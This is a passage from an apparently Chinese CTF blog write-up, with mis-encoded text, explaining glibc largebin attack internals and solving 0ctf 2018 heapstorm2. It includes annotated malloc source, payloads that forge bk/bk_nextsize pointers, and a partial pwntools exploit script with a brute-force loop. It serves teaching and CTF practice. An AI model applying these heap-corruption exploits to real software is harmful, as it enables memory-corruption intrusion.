class="keyword">long</span>) (victim-&gt;<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)) <span class="comment">//åˆ¤æ–­é“¾è¡¨çš„ç¬¬ä¸€ä¸ªç»“ç‚¹ï¼Œå³æœ€å¤§çš„chunkæ˜¯å¦å¤§äºè¦ç”³è¯·çš„size</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize; </span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span> = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))) <span class="comment">//ä»æœ€å°çš„chunkå¼€å§‹ï¼Œåå‘éå† chunk sizeé“¾è¡¨ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¤§äºç­‰äºæ‰€éœ€chunkå¤§å°çš„chunké€€å‡ºå¾ªç¯</span></span><br><span class="line">                victim = victim-&gt;bk_nextsize;  <span class="comment">//æ¼æ´ç‚¹ï¼Œä¼ªé€ bk_nextsize</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;<span class="built_in">size</span> == victim-&gt;fd-&gt;<span class="built_in">size</span>) <span class="comment">//ç”³è¯·çš„chunkå¯¹åº”çš„chunkå­˜åœ¨å¤šä¸ªç»“ç‚¹ï¼Œåˆ™ç”³è¯·ç›¸åº”å †å¤´çš„ä¸‹ä¸ªç»“ç‚¹ï¼Œä¸ç”³è¯·å †å¤´ã€‚</span></span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//largebin unlink æ“ä½œ</span></span><br><span class="line"></span><br><span class="line">            ... </span><br><span class="line">            <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>

<p><strong>å½“åˆ©ç”¨bk_nextsizeåå‘éå†åŒé“¾è¡¨æ—¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä¼ªé€ å †å¤´èŠ‚ç‚¹çš„bk_nextsizeï¼Œè®©å…¶æŒ‡å‘ä¸€ä¸ªevilå†…å­˜åœ°å€ï¼Œç„¶åæˆ‘ä»¬ åœ¨evil_addrä¸Šæ„é€ äº†ç›¸åº”çš„æ•°æ®ä»¥é€šè¿‡unlinkï¼Œä¼šå°†è¯¥ç©ºé—´è¿”å›ç”³è¯·åˆ°éé¢„æœŸçš„å†…å­˜</strong></p>
<p><strong>ç»•è¿‡unlinkæœ€ç®€å• çš„å°±æ˜¯fdä¸bkæŒ‰ç…§smallbinçš„unlinkæ–¹å¼è®¾ç½®ï¼Œç„¶åä¸¤ä¸ªnextsizeæŒ‡é’ˆéƒ½ä¸ºnull</strong></p>
<p>ä¸‹é¢è´´ä¸Šå¤§ä½¬çš„è§£é‡Šï¼š</p>
<p><em>é—®é¢˜å‡ºç°åœ¨é€šè¿‡<code>bk_nextsize</code>åå‘éå†åŒé“¾è¡¨çš„è¿‡ç¨‹ï¼Œå¦‚æœèƒ½å¤Ÿä¼ªé€ æŸä¸ªå †å¤´ç»“ç‚¹ä¸­çš„<code>bk_nextsize</code>ï¼Œå°†å…¶æŒ‡å‘éé¢„æœŸçš„å†…å­˜åœ°å€ï¼Œæ„é€ å¥½æ•°æ®ä½¿å¾—éé¢„æœŸå†…å­˜åœ°å€åœ¨é€šè¿‡unlinkçš„æ£€æŸ¥ä¹‹åï¼Œä¼šå°†è¯¥ç©ºé—´è¿”å›ç»™ç”¨æˆ·ï¼Œæœ€ç»ˆä½¿å¾—å¯ä»¥ç”³è¯·å‡ºéé¢„æœŸçš„å†…å­˜ã€‚æœ€å¸¸è§çš„å°±æ˜¯ç”¨å®ƒæ¥æ„é€ overlap chunkã€‚</em></p>
<p><em>è‡³äºç»•è¿‡<code>unlink</code>çš„æ£€æŸ¥ï¼Œæˆ‘è®¤ä¸ºæœ€å¥½çš„æ–¹å¼å°±æ˜¯ä¼ªé€ çš„å†…å­˜ç©ºé—´å°†<code>fd</code>ä¸<code>bk</code>æŒ‰ç…§smallbin<code>unlink</code>çš„åˆ©ç”¨æ–¹å¼è®¾ç½®ï¼Œè€Œå°†<code>bk_nextsize</code>å’Œ<code>fd_nextsize</code>è®¾ç½®æˆ0ï¼Œè¿™æ ·å°±ä¸ä¼šå¯¹è¿™ä¸¤ä¸ªå­—æ®µè¿›è¡Œæ“ä½œäº†ã€‚</em></p>
<p><em>å…¸å‹çš„åº”ç”¨åœºæ™¯ä¸ºï¼šå­˜åœ¨å››ä¸ªå †ABCDï¼Œlargebinä¸­å­˜åœ¨é“¾è¡¨A-&gt;Bï¼Œå…¶ä¸­Aä¸º0x420ï¼ŒBä¸º0x400ï¼ŒCä¸º0x410ï¼ŒCæœªé‡Šæ”¾ã€‚å°†Bçš„<code>bk_nextsize</code>ä¼ªé€ æŒ‡å‘Cï¼ŒåŒæ—¶å°†Cçš„<code>fd</code>ä¸<code>bk</code>æ„é€ å¥½ï¼Œå°†Cçš„<code>fd_nextsize</code>ä¸<code>bk_nextsize</code>èµ‹å€¼ä¸º0ï¼Œå½“å†æ¬¡ç”³è¯·0x410å¤§å°çš„å†…å­˜Eæ—¶ï¼Œéå†<code>B-&gt;bk_nextsize</code>ä¼šæŒ‡å‘Cï¼Œä¸”Cçš„å¤§å°æ»¡è¶³éœ€æ±‚ï¼Œå› æ­¤ä¼šè°ƒç”¨unlinkå°†Cä»åŒé“¾è¡¨å–ä¸‹ï¼Œå› æ­¤ç”³è¯·å‡ºæ¥çš„å †å—Eçš„åœ°å€ä¼šä¸ºCçš„åœ°å€ï¼Œå³Eå’ŒCä¸ºåŒä¸€å†…å­˜å—ï¼Œå®ç°overlap chunkçš„æ„é€ ã€‚</em></p>
<h2 id="ä¼ªé€ largebinçš„bk-nextsizeä»¥åŠbkï¼ˆæ’å…¥largebinæ—¶ï¼‰"><a href="#ä¼ªé€ largebinçš„bk-nextsizeä»¥åŠbkï¼ˆæ’å…¥largebinæ—¶ï¼‰" class="headerlink" title="ä¼ªé€ largebinçš„bk_nextsizeä»¥åŠbkï¼ˆæ’å…¥largebinæ—¶ï¼‰"></a>ä¼ªé€ largebinçš„bk_nextsizeä»¥åŠbkï¼ˆæ’å…¥largebinæ—¶ï¼‰</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">...<span class="comment">//å°†largebinä»unsorted binä¸­å–ä¸‹</span></span><br><span class="line">       unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">       bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line">         </span><br><span class="line">     </span><br><span class="line">			  <span class="comment">//å¦‚æœå¤§å°ä¸ä¸€æ ·(å³æ­¤æ—¶fwdæ˜¯ç›¸é‚»çš„å¤§äºvictimçš„chunk)</span></span><br><span class="line">                  	 <span class="comment">//éœ€è¦æ„é€ nextsizeåŒå‘é“¾è¡¨ï¼Œæ„é€ æ–°èŠ‚ç‚¹,victimä½œä¸ºå †å¤´</span></span><br><span class="line">                      <span class="comment">//å¦åˆ™è¿™ä¸ªchunkå°†ä¼šæˆä¸ºå †å¤´ï¼Œ`bk_nextsize`å’Œ`fd_nextsize`å°†è¢«ç½®ä½</span></span><br><span class="line">                       <span class="comment">//æ¯”victimå°çš„æŒ‡å‘fwdï¼ˆfd_nextsizeï¼‰</span></span><br><span class="line">                       <span class="comment">//æ¯”victimå¤§çš„æŒ‡å‘fwdçš„bk_nextsizeï¼ˆæ¯”fwdå¤§çš„é‚£ä¸ªï¼‰</span></span><br><span class="line">                       <span class="comment">//ç›¸å½“äºæ’å…¥äº†fwdä¸fwd-&gt;bk_nextsizeä¹‹é—´</span></span><br><span class="line">                       victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                       victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="comment">//ç”±äºfwd-&gt;bk_nextsizeå¯æ§ï¼Œå› æ­¤victim-&gt;bk_nextsizeå¯æ§</span></span><br><span class="line">                       fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                       victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//victim-&gt;bk_nextsizeå¯æ§ï¼Œå› æ­¤å®ç°äº†å¾€ä»»æ„åœ°å€å†™victimçš„èƒ½åŠ›</span></span><br><span class="line">                     &#125;</span><br><span class="line">                   bck = fwd-&gt;bk; <span class="comment">//ç”±äºfwd-&gt;bkå¯æ§ï¼Œå› æ­¤bckå¯æ§</span></span><br><span class="line">              ...</span><br><span class="line"></span><br><span class="line">       mark_bin (av, victim_index);</span><br><span class="line">       <span class="comment">//è®¾ç½®fdä¸bkå®Œæˆæ’å…¥</span></span><br><span class="line">       victim-&gt;bk = bck; </span><br><span class="line">       victim-&gt;fd = fwd;</span><br><span class="line">       fwd-&gt;bk = victim;</span><br><span class="line">       bck-&gt;fd = victim; <span class="comment">//bckå¯æ§ï¼Œå› æ­¤å®ç°äº†å¾€ä»»æ„åœ°å€å†™victimçš„èƒ½åŠ›</span></span><br><span class="line">       ...</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h1 id="ä¾‹é¢˜1ï¼š0ctf-2018-heapstorm2ï¼ˆæ’å…¥æ—¶æ”»å‡»ï¼‰"><a href="#ä¾‹é¢˜1ï¼š0ctf-2018-heapstorm2ï¼ˆæ’å…¥æ—¶æ”»å‡»ï¼‰" class="headerlink" title="ä¾‹é¢˜1ï¼š0ctf_2018_heapstorm2ï¼ˆæ’å…¥æ—¶æ”»å‡»ï¼‰"></a>ä¾‹é¢˜1ï¼š0ctf_2018_heapstorm2ï¼ˆæ’å…¥æ—¶æ”»å‡»ï¼‰</h1><p><em>æœ¬é¢˜æ˜¯å…¸å‹çš„house of stormï¼Œå¯ä»¥åšä¸€ä¸ªä»»æ„å†™+ä¸€ä¸ªä»»æ„ç”³è¯·ï¼Œå¨åŠ›è¿˜æ˜¯ç›¸å½“ç»™åŠ›çš„ã€‚</em></p>
<h2 id="é¢˜ç›®æ¦‚è§ˆ"><a href="#é¢˜ç›®æ¦‚è§ˆ" class="headerlink" title="é¢˜ç›®æ¦‚è§ˆ"></a>é¢˜ç›®æ¦‚è§ˆ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>

<p><code>mallopt(M_MXFAST,0)</code>å°†<code>global_max_fast</code>è®¾ç½®ä¸º0,è¿™ä¸ªå€¼çš„æ„æ€æ˜¯æœ€å¤§ä¸ºå¤šå¤§çš„chunkå½’fastbinç®¡ç†,è®¾ç½®ä¸º0è¡¨ç¤ºè¿™ä¸ªç¨‹åºä¸­ä¸å†å­˜åœ¨fastbinã€‚å³æœ¬ç¨‹åºç¦ç”¨äº†fastbinã€‚</p>
<p><img src="https://s1.ax1x.com/2020/08/25/d2Zmvt.png" alt></p>
<p>åœ¨editå‡½æ•°ä¸­æœ‰ä¸€ä¸ª<strong>off-by-null</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/25/d2eTTU.png" alt></p>
<p>å‰©ä¸‹çš„å°±æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„uafã€‚</p>
<h2 id="æ”»å‡»è¿‡ç¨‹"><a href="#æ”»å‡»è¿‡ç¨‹" class="headerlink" title="æ”»å‡»è¿‡ç¨‹"></a>æ”»å‡»è¿‡ç¨‹</h2><p>é¦–å…ˆæˆ‘ä»¬é€ ä¸¤ä¸ªoverlapåˆ°unsortedbiné‡Œã€‚(overlapçš„è¿‡ç¨‹æˆ‘å°±å…ˆä¸è¯´äº†ï¼Œå¯ä»¥åšå‰å‘åˆå¹¶å¯ä»¥åšåå‘åˆå¹¶)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsortbin: <span class="number">0x100203060</span> (<span class="built_in">size</span> : <span class="number">0x4f0</span>) &lt;--&gt; <span class="number">0x1002035c0</span> (<span class="built_in">size</span> : <span class="number">0x4e0</span>)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬addï¼ˆ0x4e8ï¼‰ï¼Œä»unsortedbinçš„å°¾éƒ¨å‘å‰éå†ï¼Œå°†sizeä¸º0x4e0çš„æ”¾å…¥largebinï¼Œè¿”å›sizeä¸º0x4f0çš„ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   unsortbin: <span class="number">0x0</span></span><br><span class="line">largebin[ <span class="number">3</span>]: <span class="number">0x1002035c0</span> (<span class="built_in">size</span> : <span class="number">0x4e0</span>)</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†æŠŠ0x4e8çš„æ”¾è¿›unsortedbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   unsortbin: <span class="number">0x100203060</span> (<span class="built_in">size</span> : <span class="number">0x4f0</span>)</span><br><span class="line">largebin[ <span class="number">3</span>]: <span class="number">0x1002035c0</span> (<span class="built_in">size</span> : <span class="number">0x4e0</span>)</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶largebinä¸­çš„chunkæ˜¯å¤§äºunsortedbinä¸­çš„chunkçš„ï¼Œé‚£ä¹ˆfwdæ­¤æ—¶å°±åº”è¯¥æŒ‡å‘0x1002035c0è¿™ä¸€ä¸ªchunkï¼Œvictimæ˜¯unsortedbinä¸­çš„chunkã€‚</p>
<p>æˆ‘ä»¬å†è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">storge = <span class="number">0x13370800</span></span><br><span class="line">fake_chunk = storge<span class="number">-0x20</span></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x4f1</span>)+p64(<span class="number">0</span>)+p64(fake_chunk)</span><br><span class="line">edit(<span class="number">7</span>,p1)                  <span class="comment"># åŠ«æŒunsortfbinä¸­chunkçš„bkæŒ‡é’ˆæŒ‡å‘fakechunk</span></span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4e1</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>)+p64(fake_chunk+<span class="number">8</span>)          <span class="comment"># åŠ«æŒåœ¨largebinä¸­chunkçš„bkæŒ‡é’ˆé¿å…unlinkæ—¶å´©æºƒ</span></span><br><span class="line">p2 +=  p64(<span class="number">0</span>)+p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)    <span class="comment"># åŠ«æŒåœ¨largebinä¸­chunkçš„bk_nextsizeæŒ‡é’ˆ</span></span><br><span class="line">edit(<span class="number">8</span>,p2)</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>æ­¤æ—¶unsortedbinä¸­çš„chunkçš„bkæŒ‡é’ˆè¢«åŠ«æŒæŒ‡å‘æˆ‘ä»¬çš„fakechunkï¼Œå¦‚æœæˆ‘ä»¬å†addï¼ˆ0x48ï¼‰æ—¶ï¼Œç¨‹åºé¦–å…ˆåœ¨fastbinå’Œsmallbinä¸­æ‰¾ç©ºé—²çš„chunkï¼Œä½†æ˜¯æ²¡æœ‰ï¼Œäºæ˜¯å»unsortedbinä¸­æ‰¾ï¼Œç¬¬ä¸€æ¬¡æ‰¾åˆ°å¤§å°ä¸º0x4f0çš„ï¼Œè¿™ä¸ªå¤§å°è‚¯å®šæ˜¯ä¸å¯¹çš„ï¼Œä½†æ˜¯æ£€æµ‹åˆ°unsortedbinä¸­è¿˜æœ‰ä¸€ä¸ªchunkï¼ˆå³æˆ‘ä»¬åŠ«æŒbkæŒ‡é’ˆåæŒ‡å‘çš„fakechunkï¼‰å¹¶ä¸ä¼šå¯¹å¤§å°ä¸º0x4f0çš„chunkåšåˆ‡å‰²ï¼Œè€Œæ˜¯ç›´æ¥åšsortedï¼Œå³æ’å…¥largebinï¼ˆæ­¤æ—¶è§¦å‘largebin attackç»™fakechunkå†™ä¸Šä¸€ä¸ªsizeï¼‰ã€‚ç„¶åç³»ç»Ÿé¡ºç€æˆ‘ä»¬åŠ«æŒçš„bkæŒ‡é’ˆæ‰¾ï¼Œæ‰¾åˆ°äº†æˆ‘ä»¬çš„fakechunkï¼Œæ­¤æ—¶çš„fakechunkæ˜¯æœ‰sizeçš„ï¼Œç„¶åç³»ç»Ÿå»æ£€éªŒä»–çš„sizeï¼Œå‘ç°é™¤å»æ ‡å¿—ä½åˆšå¥½æ˜¯0x50ï¼Œé‚£ä¹ˆå°±æŠŠfake chunkè¿”å›ç»™æˆ‘ä»¬ã€‚</strong></p>
<hr>
<p><img src="https://s1.ax1x.com/2020/08/29/dTXFk4.png" alt></p>
<p>ç„¶åaddä¸€æ¬¡0x48ï¼ˆç”±äºcallocçš„æ£€æŸ¥ï¼Œæ­¤å¤„è¢«é”™ä½å†™ä¸Šå»çš„sizeå¿…é¡»è¦æ˜¯0x56ï¼Œå¤šçˆ†ç ´å‡ æ¬¡ï¼‰</p>
<p>é™¤å»æ ‡å¿—ä½0x56å°±æ˜¯0x50äº†ï¼Œæˆ‘ä»¬ç”³è¯·0x48ï¼Œä¼šè¿”å›è¿™ä¸ªfake_chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>)       <span class="comment"># 2,largebin attackè§¦å‘</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/08/27/df6jaR.png" alt></p>
<p>ç„¶åæˆ‘ä»¬å†™ä¸€ä¸ªwhileçˆ†ç ´ä¸€ä¸‹:</p>
<p><img src="https://s1.ax1x.com/2020/08/27/dfgklT.png" alt></p>
<p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶çˆ†ç ´æˆåŠŸï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹è¡¨ä¸­ç›¸å…³å†…å®¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p3 = p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x13377331</span>)+p64(storage)</span><br><span class="line">edit(<span class="number">2</span>,p3)</span><br></pre></td></tr></table></figure>

<p>æ¥bypassæ‰showæ—¶å€™çš„éªŒè¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (chunk_list[<span class="number">1</span>].size ^ chunk_list[<span class="number">1</span>].addr) != <span class="number">0x13377331</span> )</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">"Permission denied"</span>);</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨showäº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rls = <span class="keyword">lambda</span> n=<span class="number">2</span>**<span class="number">20</span>: io.recvlines(n)</span><br><span class="line"> </span><br><span class="line">libc_path = <span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span></span><br><span class="line">elf_path = <span class="string">"./0ctf_2018_heapstorm2"</span></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line"><span class="comment">#io = remote("node3.buuoj.cn",26000)</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">'1'</span>:</span><br><span class="line">    context(log_level = <span class="string">'debug'</span>,terminal= <span class="string">'/bin/zsh'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>]==<span class="string">'0'</span>:</span><br><span class="line">    context(log_level = <span class="string">'info'</span>,terminal= <span class="string">'/bin/zsh'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#io = process([elf_path],env=&#123;"LD_PRELOAD":libc_path&#125;)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">cho=<span class="string">'Command: '</span>      <span class="comment"># choiceæç¤ºè¯­</span></span><br><span class="line">siz=<span class="string">'Size: '</span>     <span class="comment"># sizeè¾“å…¥æç¤ºè¯­</span></span><br><span class="line">con=<span class="string">'Content: '</span>         <span class="comment"># contentè¾“å…¥æç¤ºè¯­</span></span><br><span class="line">ind=<span class="string">'Index: '</span>      <span class="comment"># indexè¾“å…¥æç¤ºè¯­</span></span><br><span class="line">edi=<span class="string">''</span>          <span class="comment"># editè¾“å…¥æç¤ºè¯­</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,c=<span class="string">'1'</span>)</span>:</span></span><br><span class="line">    sal(cho,c)</span><br><span class="line">    sal(siz,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index,c=<span class="string">'3'</span>)</span>:</span></span><br><span class="line">    sal(cho,c)</span><br><span class="line">    sal(ind,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index,c=<span class="string">'4'</span>)</span>:</span></span><br><span class="line">    sal(cho,c)</span><br><span class="line">    sal(ind,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content=<span class="string">''</span>,c=<span class="string">'2'</span>)</span>:</span></span><br><span class="line">    sal(cho,c)</span><br><span class="line">    sal(ind,str(index))</span><br><span class="line">    sal(siz,str(len(content)))</span><br><span class="line">    sa(con,content)</span><br><span class="line"><span class="comment"># è·å–pieåŸºåœ°å€</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proc_base</span><span class="params">(p)</span>:</span></span><br><span class="line">    proc_base = p.libs()[p._cwd+p.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    info(hex(proc_base))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># è·å–libcåŸºåœ°å€   </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_libc_base</span><span class="params">(p)</span>:</span></span><br><span class="line">    libc_base = p.libs()[libc_path]</span><br><span class="line">    info(hex(libc_base)) </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># get_proc_base(io)</span></span><br><span class="line">        <span class="comment"># get_libc_base(io)</span></span><br><span class="line">        <span class="keyword">global</span> io</span><br><span class="line">        io = process(elf_path) </span><br><span class="line">        <span class="comment">#io = remote("node3.buuoj.cn",29327)</span></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 0</span></span><br><span class="line">        add(<span class="number">0x508</span>)                  <span class="comment"># 1</span></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 2</span></span><br><span class="line">        edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))        <span class="comment"># è®¾ç½®fake_pre_size</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 3</span></span><br><span class="line">        add(<span class="number">0x508</span>)                  <span class="comment"># 4</span></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 5</span></span><br><span class="line">        edit(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))        <span class="comment"># è®¾ç½®fake_pre_size</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 6</span></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        edit(<span class="number">0</span>,<span class="string">'a'</span>*(<span class="number">0x18</span><span class="number">-0xc</span>))              <span class="comment"># 